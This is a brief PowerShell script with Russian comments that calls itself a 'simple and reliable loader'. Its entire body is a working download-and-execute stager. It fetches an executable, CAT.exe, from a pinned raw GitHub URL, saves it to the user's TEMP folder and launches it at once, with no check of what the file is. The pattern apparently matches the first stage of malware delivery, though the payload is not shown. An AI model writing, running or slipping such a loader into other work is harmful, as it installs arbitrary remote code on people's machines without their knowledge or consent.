# === Простой и надёжный загрузчик ===

Write-Host "[+] Загрузчик запущен..." -ForegroundColor Green

# Скачиваем CAT.exe
$exeUrl = "https://raw.githubusercontent.com/hk1500/s/22bee0700f758a2aafcf592fd66d1bcd208e7644/1.exe"
$exePath = "$env:TEMP\CAT.exe"

try {
    irm -Uri $exeUrl -OutFile $exePath
    Write-Host "[+] CAT.exe успешно скачан" -ForegroundColor Cyan
    
    # Запускаем
    Start-Process -FilePath $exePath -NoNewWindow
    Write-Host "[+] CAT.exe запущен!" -ForegroundColor Green
}
catch {
    Write-Host "[-] Ошибка: $($_.Exception.Message)" -ForegroundColor Red
}
